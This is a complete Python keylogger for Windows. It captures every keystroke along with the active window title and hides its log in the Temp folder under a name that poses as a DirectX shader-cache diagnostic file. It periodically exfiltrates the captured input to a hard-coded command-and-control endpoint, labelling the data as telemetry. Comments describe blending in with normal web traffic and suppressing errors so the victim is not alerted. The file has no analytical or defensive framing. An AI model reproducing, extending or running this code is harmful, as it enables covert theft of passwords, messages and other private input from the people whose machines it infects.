import logging
import time
import threading
import queue
import requests
import os
import ctypes
from pynput import keyboard

# Masquerade as a DirectX Diagnostic log in the Temp folder
LOG_FILE = os.path.join(os.getenv('TEMP'), "D3D_ShaderCache_Diag.log")
C2_URL = "http://10.10.10.158:80/api/v1/telemetry"
EXFIL_INTERVAL = 300

# Native Windows API Setup
user32 = ctypes.windll.user32

# Standard local logging
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s', force=True)

# Thread-safe storage
exfil_queue = queue.Queue()
buffer_lock = threading.Lock()
current_window = ""
input_buffer = ""
current_hwnd = None

def get_window_info():
    """Returns the unique Handle and Title using native User32.dll calls."""
    try:
        # Get the handle to the active window
        hwnd = user32.GetForegroundWindow()

        # Get the length of the title to create a buffer of the correct size
        length = user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)

        # Fill the buffer with the window title
        user32.GetWindowTextW(hwnd, buff, length + 1)

        return hwnd, buff.value
    except Exception:
        return None, "Unknown_Window_Context"

def flush_buffer():
    """Thread-safe write to local log and exfiltration queue."""
    global input_buffer, current_window
    with buffer_lock:
        if not input_buffer:
            return

        log_entry = f"[{current_window}] Input: {input_buffer}"
        logging.info(log_entry)
        exfil_queue.put(log_entry)
        input_buffer = ""

def exfiltrate_data():
    """Background loop that periodically pushes queued data to the C2."""
    while True:
        time.sleep(EXFIL_INTERVAL)
        flush_buffer()

        if exfil_queue.empty():
            continue

        payload_data = ""
        while not exfil_queue.empty():
            try:
                payload_data += exfil_queue.get_nowait() + "\n"
            except queue.Empty:
                break

        payload = {
            "device_status": "active",
            "telemetry_data": payload_data
        }

        try:
            # Use a generic User-Agent to blend in with web traffic
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
            response = requests.post(C2_URL, json=payload, headers=headers, timeout=10)

            # If the C2 accepts the data, we consider it 'delivered'
            if response.status_code != 200:
                # If C2 is down, re-queue the data for the next attempt
                exfil_queue.put(payload_data)
        except Exception:
            # Silence network errors to avoid alerting the user
            pass

def on_press(key):
    """Callback for keyboard events."""
    global current_hwnd, current_window, input_buffer
    new_hwnd, new_title = get_window_info()

    # If the user switches windows, flush the current buffer immediately
    if new_hwnd != current_hwnd:
        if input_buffer:
            flush_buffer()
        current_hwnd = new_hwnd
        current_window = new_title

    with buffer_lock:
        try:
            # Handle standard character keys
            input_buffer += key.char
        except AttributeError:
            # Handle special keys
            if key == keyboard.Key.enter:
                input_buffer += " <enter>"
                # Run flush in a separate thread to keep the listener responsive
                threading.Thread(target=flush_buffer).start()
            elif key == keyboard.Key.space:
                input_buffer += " "
            elif key == keyboard.Key.backspace:
                input_buffer = input_buffer[:-1]

def main():
    # Start the exfiltration thread as a daemon
    exfil_thread = threading.Thread(target=exfiltrate_data, daemon=True)
    exfil_thread.start()

    # Start the keyboard listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()